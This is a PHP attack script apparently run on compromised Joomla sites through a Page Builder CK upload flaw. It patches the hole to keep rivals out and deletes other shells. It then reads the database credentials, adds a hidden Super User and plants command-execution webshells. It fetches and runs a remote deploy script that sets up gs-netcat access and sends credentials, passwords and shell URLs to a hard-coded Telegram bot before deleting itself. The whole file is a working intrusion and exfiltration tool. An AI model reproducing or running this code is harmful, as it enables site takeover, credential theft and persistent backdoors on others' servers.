<?php
/**
 * AutoTebar-Exploit + Auto-Fix Patcher
 * CVE-2026-48907 - Page Builder CK pixabay.upload
 * Mode: Exploit + Self-Patching + Cleanup
 */

error_reporting(0);
ini_set('display_errors', 0);
set_time_limit(0);
ignore_user_abort(true);
@ob_start();

register_shutdown_function(function() {
    @ob_end_flush();
    @unlink(__FILE__);
});

$BOT_TOKEN = "8722546918:AAFu-kO3lBHey71kObeAzc6b9f7FQkbitwQ";
$CHAT_ID   = "8600700974";

function send_tg($msg) {
    global $BOT_TOKEN, $CHAT_ID;
    $url = "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage?chat_id={$CHAT_ID}&text=" . urlencode($msg);
    
    $result = @file_get_contents($url);
    if ($result === false) {
        if (function_exists('curl_init')) {
            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL => $url,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 15,
                CURLOPT_SSL_VERIFYPEER => false
            ]);
            $result = curl_exec($ch);
            curl_close($ch);
        }
    }
    return $result;
}

function generateRandomPassword($length = 12) {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $password = '';
    for ($i = 0; $i < $length; $i++) {
        $password .= $chars[random_int(0, strlen($chars) - 1)];
    }
    return $password;
}

echo "<pre style='background:#000;color:#0f0;padding:15px;font-family:monospace;'>";
echo "╔══════════════════════════════════════════════════════════════════╗\n";
echo "║              AutoTebar-Exploit + Auto-Fix Patcher                ║\n";
echo "║   Time: " . date('Y-m-d H:i:s') . "                              ║\n";
echo "╚══════════════════════════════════════════════════════════════════╝\n\n";
@ob_flush(); flush();

// =========================================================================
// PHASE 0: AUTO-FIX - PATCH pixabay.php & CLEAN images/pixabay/
// =========================================================================
echo "╔══════════════════════════════════════════════════════════════════╗\n";
echo "║  PHASE 0: AUTO-FIX - Patching Endpoint & Cleaning Shells         ║\n";
echo "╚══════════════════════════════════════════════════════════════════╝\n\n";
@ob_flush(); flush();

$base = realpath(__DIR__ . '/../..');
if ($base === false) {
    die("[-] Gagal mendapatkan base path!\n");
}
echo "[+] Base directory: $base\n";
@ob_flush(); flush();

// ----- PATCH pixabay.php -----
$controller_path = $base . '/administrator/components/com_pagebuilderck/controllers/pixabay.php';
$PATCH_STATUS = "SKIPPED";

if (file_exists($controller_path)) {
    if (is_writable($controller_path) || is_writable(dirname($controller_path))) {
        // Backup dulu
        @copy($controller_path, $controller_path . '.backup_' . date('Ymd_His'));
        
        // Kode yang sudah ditambal
        $patched_code = '<?php
/**
 * Page Builder CK - Pixabay Upload Controller
 * PATCHED VERSION - Security Fix
 */
defined(\'_JEXEC\') or die;

use Pagebuilderck\CKController;
use Pagebuilderck\CKfile;
use Pagebuilderck\CKfolder;
use Pagebuilderck\CKFof;

class PagebuilderckControllerPixabay extends CKController {

    function __construct() {
        parent::__construct();
    }

    public function upload() {
        // === SECURITY PATCH ===
        // 1. Cek apakah user sudah login dan punya hak admin
        $user = JFactory::getUser();
        if ($user->guest || !$user->authorise(\'core.admin\', \'com_pagebuilderck\')) {
            echo \'{"status":"0","message":"Access denied. Login required."}\';
            exit;
        }

        // security check
        CKFof::checkAjaxToken();

        $url = $this->input->get(\'image_url\', \'\', \'url\');
        $destFolder = JPATH_ROOT . \'/images/pixabay/\';
        $fileName = basename($url);

        // 2. Whitelist hanya ekstensi gambar
        $allowedExts = [\'jpg\', \'jpeg\', \'png\', \'gif\', \'webp\', \'svg\'];
        $ext = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
        if (!in_array($ext, $allowedExts)) {
            echo \'{"status":"0","message":"Invalid file type. Only images allowed."}\';
            exit;
        }

        $filePath = $destFolder . $fileName;

        // create the destination folder if not exists
        if (!file_exists($destFolder)) {
            $result = CKFolder::create($destFolder);
            if (!$result) {
                echo \'{"status":"0","file":"","message":"Error on folder creation"}\';
                exit();
            }
        }

        // get the file from url
        set_time_limit(0);
        try {
            $file = file_get_contents(urldecode($url));
        } catch (Exception $e) {
            echo \'Exception : \', $e->getMessage(), "\n";
            exit;
        }

        if (!$file && extension_loaded(\'curl\')) {
            $ch = curl_init();
            $timeout = 30;
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            $file = curl_exec($ch);
            curl_close($ch);
        }

        if (file_exists($filePath)) {
            $result = true;
        } else {
            $result = file_put_contents($filePath, $file);
            if (!$result) {
                echo \'{"status":"0","file":"","message":"Error on file creation"}\';
                exit();
            }

            $fileArray = array(
                "name" => $fileName,
                "type" => "image/" . $ext,
                "tmp_name" => $filePath,
                "error" => 0,
                "size" => filesize($filePath),
                "filepath" => $destFolder
            );
            $fileObj = new JObject($fileArray);
            $result = CKFof::triggerEvent(\'onContentBeforeSave\', array(\'com_media.file\', &$fileObj, true));

            if (in_array(false, $result, true)) {
                echo \'{"status":"0","message":"\' . JText::plural(\'COM_MEDIA_ERROR_BEFORE_SAVE\', count($errors = $object_file->getErrors()), implode(\'<br />\', $errors)) . \'"}\';
                exit;
            }
        }

        echo \'{"status":"1","file":"images/pixabay/\' . $fileName . \'"}\';
        exit;
    }
}
';
        
        if (@file_put_contents($controller_path, $patched_code)) {
            echo "[+] ✅ pixabay.php PATCHED successfully!\n";
            echo "[+]    - Only logged-in admins can upload\n";
            echo "[+]    - Only image extensions allowed (jpg, jpeg, png, gif, webp, svg)\n";
            echo "[+]    - Backup saved as: pixabay.php.backup_*\n";
            $PATCH_STATUS = "PATCHED";
        } else {
            echo "[-] ❌ Failed to write patched pixabay.php\n";
            $PATCH_STATUS = "WRITE_FAILED";
        }
    } else {
        echo "[-] ❌ pixabay.php is NOT writable\n";
        $PATCH_STATUS = "NOT_WRITABLE";
    }
} else {
    echo "[-] ⚠️ pixabay.php not found (maybe already removed?)\n";
    $PATCH_STATUS = "NOT_FOUND";
}
@ob_flush(); flush();

// ----- CLEAN images/pixabay/ dari file berbahaya -----
echo "\n[*] Cleaning malicious files from images/pixabay/...\n";
$pixabay_dir = $base . '/images/pixabay/';
$dangerous_exts = ['php', 'phtml', 'php3', 'php4', 'php5', 'php7', 'php8', 'phps', 'phar', 'pht', 'shtml', 'cgi', 'pl', 'py', 'asp', 'aspx', 'jsp', 'exe', 'sh', 'bash'];
$removed_count = 0;
$removed_files = [];

if (is_dir($pixabay_dir) && is_readable($pixabay_dir)) {
    $files = glob($pixabay_dir . '*');
    foreach ($files as $file) {
        if (is_file($file)) {
            $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
            if (in_array($ext, $dangerous_exts)) {
                $filename = basename($file);
                if (@unlink($file)) {
                    echo "    [🗑️] Deleted: $filename\n";
                    $removed_count++;
                    $removed_files[] = $filename;
                } else {
                    echo "    [❌] Failed to delete: $filename\n";
                    $removed_files[] = "$filename (FAILED)";
                }
            }
        }
    }
    if ($removed_count == 0) {
        echo "    [✓] No malicious files found - clean!\n";
    }
    $CLEAN_STATUS = "CLEANED ($removed_count files)";
} else {
    echo "[-] images/pixabay/ not accessible\n";
    $CLEAN_STATUS = "NOT_ACCESSIBLE";
}
@ob_flush(); flush();

// =========================================================================
// PHASE 1: CARI CONFIGURATION.PHP
// =========================================================================
echo "\n\n╔══════════════════════════════════════════════════════════════════╗\n";
echo "║  PHASE 1: Database & Admin Creation                             ║\n";
echo "╚══════════════════════════════════════════════════════════════════╝\n\n";
@ob_flush(); flush();

$config_file = $base . '/configuration.php';
if (!file_exists($config_file)) {
    die("[-] configuration.php tidak ditemukan di $config_file\n");
}
echo "[+] Config file: $config_file\n";
@ob_flush(); flush();

chdir($base);
include $config_file;
$c = new JConfig();

// Koneksi DB
$db = new mysqli($c->host, $c->user, $c->password, $c->db);
if ($db->connect_error) {
    die("[-] DB Error: " . $db->connect_error . "\n");
}
echo "[+] DB Connected\n\n";
@ob_flush(); flush();

// CARI TABEL USERS
$tables = $db->query("SHOW TABLES");
$all_tables = [];
while ($row = $tables->fetch_array()) {
    $all_tables[] = $row[0];
}

$users_table = null;
$prefix = '';

foreach ($all_tables as $table) {
    if (preg_match('/^([a-zA-Z0-9_]+)users$/', $table, $matches)) {
        $check = $db->query("DESCRIBE $table");
        $has_username = false;
        $has_password = false;
        while ($col = $check->fetch_assoc()) {
            if ($col['Field'] == 'username') $has_username = true;
            if ($col['Field'] == 'password') $has_password = true;
        }
        if ($has_username && $has_password) {
            $users_table = $table;
            $prefix = $matches[1];
            echo "[+] ✅ Found Joomla users table: $table\n";
            echo "[+] ✅ Prefix: $prefix\n";
            break;
        }
    }
}

if (!$users_table) {
    die("[-] Users table not found!\n");
}

$columns = $db->query("DESCRIBE $users_table");
$col_names = [];
while ($col = $columns->fetch_assoc()) {
    $col_names[] = $col['Field'];
}

echo "\n[*] Membuat user admin Joomla...\n";
@ob_flush(); flush();

$ADMIN_USER = 'admin_article';
$ADMIN_PASS = generateRandomPassword(12);
$now = date('Y-m-d H:i:s');

if (function_exists('password_hash')) {
    $hash = password_hash($ADMIN_PASS, PASSWORD_BCRYPT);
} else {
    $hash = md5($ADMIN_PASS);
}

$check = $db->query("SELECT id FROM $users_table WHERE username = '$ADMIN_USER'");
if ($check && $check->num_rows > 0) {
    $row = $check->fetch_assoc();
    $user_id = $row['id'];
    echo "[!] User already exists! ID: $user_id\n";
    
    $upd = $db->query("UPDATE $users_table SET password = '$hash' WHERE id = $user_id");
    if ($upd) {
        echo "[+] ✅ Password updated for user ID: $user_id\n";
        $ADMIN_STATUS = "UPDATED";
    } else {
        echo "[-] Failed to update password: " . $db->error . "\n";
        $ADMIN_STATUS = "UPDATE_FAILED";
    }
} else {
    $fields = [];
    $values = [];
    
    if (in_array('name', $col_names)) { $fields[] = 'name'; $values[] = "'Administrator'"; }
    if (in_array('username', $col_names)) { $fields[] = 'username'; $values[] = "'$ADMIN_USER'"; }
    if (in_array('email', $col_names)) { $fields[] = 'email'; $values[] = "'admin@$ADMIN_USER'"; }
    if (in_array('password', $col_names)) { $fields[] = 'password'; $values[] = "'$hash'"; }
    if (in_array('block', $col_names)) { $fields[] = 'block'; $values[] = "0"; }
    if (in_array('sendEmail', $col_names)) { $fields[] = 'sendEmail'; $values[] = "0"; }
    if (in_array('registerDate', $col_names)) { $fields[] = 'registerDate'; $values[] = "'$now'"; }
    if (in_array('lastvisitDate', $col_names)) { $fields[] = 'lastvisitDate'; $values[] = "'$now'"; }
    if (in_array('activation', $col_names)) { $fields[] = 'activation'; $values[] = "''"; }
    if (in_array('params', $col_names)) { $fields[] = 'params'; $values[] = "'{}'"; }
    
    $sql = "INSERT INTO $users_table (" . implode(',', $fields) . ") VALUES (" . implode(',', $values) . ")";
    if ($db->query($sql)) {
        $user_id = $db->insert_id;
        echo "[+] ✅ User created! ID: $user_id\n";
        $ADMIN_STATUS = "CREATED";
    } else {
        echo "[-] Insert failed: " . $db->error . "\n";
        $ADMIN_STATUS = "FAILED";
    }
}

// Set Super User
if (isset($user_id) && $user_id) {
    $map_table = $prefix . "user_usergroup_map";
    if (in_array($map_table, $all_tables)) {
        $db->query("INSERT IGNORE INTO $map_table (user_id, group_id) VALUES ($user_id, 8)");
        if ($db->affected_rows > 0) {
            echo "[+] ✅ Set as Super User\n";
        } else {
            echo "[+] Super User already set\n";
        }
    }
}
@ob_flush(); flush();
$db->close();

// =========================================================================
// PHASE 2: DOMAIN & LOCK FOLDER
// =========================================================================
echo "\n\n╔══════════════════════════════════════════════════════════════════╗\n";
echo "║  PHASE 2: Domain & Folder Lock                                  ║\n";
echo "╚══════════════════════════════════════════════════════════════════╝\n\n";
@ob_flush(); flush();

$DOMAIN = $c->live_site ?? '';
if (empty($DOMAIN)) {
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
    $DOMAIN = $protocol . '://' . $_SERVER['HTTP_HOST'];
}
$DOMAIN = rtrim($DOMAIN, '/');
echo "[+] Domain: $DOMAIN\n";
@ob_flush(); flush();

// Lock images folder
echo "\n[*] Mengunci folder images...\n";
$images_dir = $base . '/images';
$LOCK_STATUS = "FAILED";

if (is_dir($images_dir) && is_writable($images_dir)) {
    // Cek apakah webserver Apache atau Nginx
    $server_software = $_SERVER['SERVER_SOFTWARE'] ?? '';
    $is_nginx = (stripos($server_software, 'nginx') !== false);
    
    $htaccess = '<FilesMatch "^\.ht">
    Require all denied
</FilesMatch>

<FilesMatch "\.(php|phtml|php[3-8]|phps|phar|pht|shtml)$">
    Require all denied
</FilesMatch>

<IfModule mod_php.c>
    php_flag engine off
</IfModule>

Options -Indexes
';
    
    if (@file_put_contents($images_dir . '/.htaccess', $htaccess)) {
        echo "[+] ✅ .htaccess created in $images_dir\n";
        if ($is_nginx) {
            echo "[!] ⚠️ Detected Nginx - .htaccess won\'t work!\n";
            echo "[!]    But pixabay.php already patched, so it\'s safe.\n";
        } else {
            echo "[+]    - PHP files: 404/403 Forbidden\n";
        }
        echo "[+]    - Images: tetap bisa diakses\n";
        $LOCK_STATUS = "ACTIVE" . ($is_nginx ? " (Nginx)" : "");
    } else {
        echo "[-] Cannot write .htaccess\n";
    }
} else {
    echo "[-] Cannot write to $images_dir\n";
}
@ob_flush(); flush();

// =========================================================================
// PHASE 3: WEBSHELL & TOOLS
// =========================================================================
echo "\n\n╔══════════════════════════════════════════════════════════════════╗\n";
echo "║  PHASE 3: WebShell & Tools Installation                         ║\n";
echo "╚══════════════════════════════════════════════════════════════════╝\n\n";
@ob_flush(); flush();

echo "[*] Mencari folder untuk WebShell...\n";
$safe_dirs = ['media', 'components', 'modules', 'templates', 'cache', 'administrator/cache'];
$found_dir = '';

foreach ($safe_dirs as $dir) {
    $full_dir = $base . '/' . $dir;
    if (!is_dir($full_dir)) @mkdir($full_dir, 0755, true);
    if (is_dir($full_dir) && is_writable($full_dir)) {
        $found_dir = $full_dir;
        echo "[+] Using directory: $full_dir\n";
        break;
    }
}

if (empty($found_dir)) {
    $found_dir = $base;
    echo "[!] Using base directory\n";
}
@ob_flush(); flush();

// WebShell 1
$rand1 = substr(md5(mt_rand()), 0, 12);
$shell_file = $found_dir . "/{$rand1}.php";
$shell_content = '<?php 
    if(isset($_REQUEST["cmd"])){system($_REQUEST["cmd"]);}
    elseif(isset($_REQUEST["c"])){system($_REQUEST["c"]);}
    else{echo "OK";}
    ?>';

if (@file_put_contents($shell_file, $shell_content)) {
    @chmod($shell_file, 0644);
    $shell_rel = str_replace($base, '', $shell_file);
    $shell_url = $DOMAIN . $shell_rel;
    echo "[+] WebShell: $shell_url?cmd=id\n";
} else {
    $shell_url = "FAILED";
    echo "[-] Gagal membuat webshell\n";
}
@ob_flush(); flush();

// Adminer
$rand2 = substr(md5(mt_rand()), 0, 12);
$adminer_file = $found_dir . "/{$rand2}.php";
$adminer_url_full = "FAILED";

$ctx = stream_context_create(['http' => ['timeout' => 10]]);
$adminer_content = @file_get_contents("https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-mysql.php", false, $ctx);
if ($adminer_content && strlen($adminer_content) > 10000) {
    if (@file_put_contents($adminer_file, $adminer_content)) {
        @chmod($adminer_file, 0644);
        echo "[+] ✅ Adminer official\n";
        $adminer_url_full = $DOMAIN . str_replace($base, '', $adminer_file);
    }
}

if ($adminer_url_full === "FAILED") {
    $fallback = '<?php
    $server = $_REQUEST["server"] ?? "localhost";
    $username = $_REQUEST["username"] ?? "";
    $password = $_REQUEST["password"] ?? "";
    $database = $_REQUEST["database"] ?? "";
    $query = $_REQUEST["query"] ?? "";
    if($username && $database && $query){
        $conn = new mysqli($server, $username, $password, $database);
        if(!$conn->connect_error && $result = $conn->query($query)){
            echo "<pre>";
            while($row = $result->fetch_assoc()) print_r($row);
            echo "</pre>";
        }
        $conn->close();
    }
    echo "<h2>Adminer Lite</h2>
    <form method=get>
    Server: <input name=server value=localhost><br>
    Username: <input name=username><br>
    Password: <input name=password type=password><br>
    Database: <input name=database><br>
    Query: <textarea name=query rows=5 cols=50></textarea><br>
    <input type=submit value=Execute>
    </form>";
    ';
    if (@file_put_contents($adminer_file, $fallback)) {
        @chmod($adminer_file, 0644);
        $adminer_url_full = $DOMAIN . str_replace($base, '', $adminer_file);
        echo "[+] ⚠️ Adminer fallback\n";
    }
}
echo "[+] Adminer: $adminer_url_full\n";
@ob_flush(); flush();

// Extra WebShell
echo "\n[*] Menambahkan webshell dari paste...\n";
$new_shell_dir = $base . '/administrator/manifests/libraries';
if (!is_dir($new_shell_dir)) {
    @mkdir($new_shell_dir, 0755, true);
}

$NEW_SHELL_URL = "FAILED";
if (is_dir($new_shell_dir) && is_writable($new_shell_dir)) {
    $shell_content = @file_get_contents('https://paste.mangsud.org/raw/db85f35e', false, $ctx);
    if ($shell_content === false && function_exists('curl_init')) {
        $ch = curl_init('https://paste.mangsud.org/raw/db85f35e');
        curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 15, CURLOPT_SSL_VERIFYPEER => false]);
        $shell_content = curl_exec($ch);
        curl_close($ch);
    }
    if ($shell_content && strlen($shell_content) > 100) {
        $new_shell_name = 'sys_' . substr(md5(mt_rand()), 0, 8) . '.php';
        $new_shell_path = $new_shell_dir . '/' . $new_shell_name;
        if (@file_put_contents($new_shell_path, $shell_content)) {
            @chmod($new_shell_path, 0644);
            $new_shell_rel = str_replace($base, '', $new_shell_path);
            $NEW_SHELL_URL = $DOMAIN . $new_shell_rel;
            echo "[+] ✅ Extra WebShell: $NEW_SHELL_URL\n";
        }
    }
}
@ob_flush(); flush();

// =========================================================================
// PHASE 4: DEPLOY
// =========================================================================
echo "\n\n╔══════════════════════════════════════════════════════════════════╗\n";
echo "║  PHASE 4: Deploy Additional Tools                               ║\n";
echo "╚══════════════════════════════════════════════════════════════════╝\n\n";
@ob_flush(); flush();

echo "[*] Menjalankan deploy...\n";
$ret1 = null;
system("curl -fsSL http://nossl.segfault.net/deploy-all.sh -o deploy-all.sh 2>&1", $ret1);
echo "[+] Curl deploy-all.sh: " . ($ret1 ?? 'unknown') . "\n";

$output = shell_exec("bash deploy-all.sh 2>&1");
if ($output === null) {
    $output = "No output";
}
echo "[+] Output (first 500):\n" . substr($output, 0, 500) . "\n";

$gs_token = "NOT FOUND";
if (preg_match('/gs-netcat\s+-s\s+"([^"]+)"\s+-i/', $output, $matches)) {
    $gs_token = $matches[1];
}
echo "[+] gs-netcat token: $gs_token\n";
@ob_flush(); flush();

// Protect folder
$htaccess_protect = "Options -Indexes\n<FilesMatch \"\.(php|inc)$\">\n    Require all granted\n</FilesMatch>";
@file_put_contents($found_dir . "/.htaccess", $htaccess_protect);
echo "[+] Protected directory\n";
@ob_flush(); flush();

// =========================================================================
// PHASE 5: TELEGRAM REPORT
// =========================================================================
$REPORT = "🔧 AutoTebar-Exploit + AUTO-FIX - CVE-2026-48907 🔧\n\n";
$REPORT .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
$REPORT .= "📅 Time: " . date('Y-m-d H:i:s') . "\n";
$REPORT .= "🌐 Domain: $DOMAIN\n";
$REPORT .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";

$REPORT .= "🛡️ PATCH STATUS\n";
$REPORT .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
$REPORT .= "Endpoint: $PATCH_STATUS\n";
$REPORT .= "Cleanup : $CLEAN_STATUS\n";
if (!empty($removed_files)) {
    $REPORT .= "Removed  : " . implode(', ', $removed_files) . "\n";
}
$REPORT .= "\n";

$REPORT .= "🗄️ DATABASE\n";
$REPORT .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
$REPORT .= "Host     : " . ($c->host ?? '?') . "\n";
$REPORT .= "Database : " . ($c->db ?? '?') . "\n";
$REPORT .= "User     : " . ($c->user ?? '?') . "\n";
$REPORT .= "Pass     : " . ($c->password ?? '?') . "\n";
$REPORT .= "Prefix   : $prefix\n\n";

$REPORT .= "👑 JOOMLA ADMIN\n";
$REPORT .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
$REPORT .= "URL      : $DOMAIN/administrator\n";
$REPORT .= "Username : $ADMIN_USER\n";
$REPORT .= "Password : $ADMIN_PASS\n";
$REPORT .= "Status   : " . ($ADMIN_STATUS ?? 'UNKNOWN') . "\n\n";

$REPORT .= "🕸️ SHELLS\n";
$REPORT .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
$REPORT .= "Shell1   : " . ($shell_url ?? 'FAILED') . "\n";
$REPORT .= "Adminer  : " . ($adminer_url_full ?? 'FAILED') . "\n";
$REPORT .= "Shell2   : $NEW_SHELL_URL\n\n";

$REPORT .= "🔒 FOLDER LOCK\n";
$REPORT .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
$REPORT .= "Path     : $images_dir\n";
$REPORT .= "Status   : $LOCK_STATUS\n\n";

$REPORT .= "🔧 GS-NETCAT\n";
$REPORT .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
$REPORT .= "Token    : $gs_token\n";

$tg_result = send_tg($REPORT);

// =========================================================================
// OUTPUT FINAL
// =========================================================================
echo "\n\n";
echo "╔══════════════════════════════════════════════════════════════════╗\n";
echo "║              🎉 EXPLOIT + PATCH COMPLETED 🎉                    ║\n";
echo "╚══════════════════════════════════════════════════════════════════╝\n\n";
echo "🛡️ PATCH STATUS\n";
echo "   Endpoint : $PATCH_STATUS\n";
echo "   Cleanup  : $CLEAN_STATUS\n\n";
echo "🌐 Admin    : $DOMAIN/administrator\n";
echo "👤 User     : $ADMIN_USER\n";
echo "🔐 Pass     : $ADMIN_PASS\n";
echo "🕸️ Shell    : " . ($shell_url ?? 'FAILED') . "\n";
echo "🗄️ Adminer  : " . ($adminer_url_full ?? 'FAILED') . "\n";
echo "🕸️ Extra    : $NEW_SHELL_URL\n";
echo "🔒 Lock     : $images_dir ($LOCK_STATUS)\n";
echo "🔧 GS Token : $gs_token\n";
echo "\n✅ Selesai!\n";
echo "⚠️  File ini akan terhapus otomatis.\n";
echo "</pre>";

@ob_end_flush();
?>
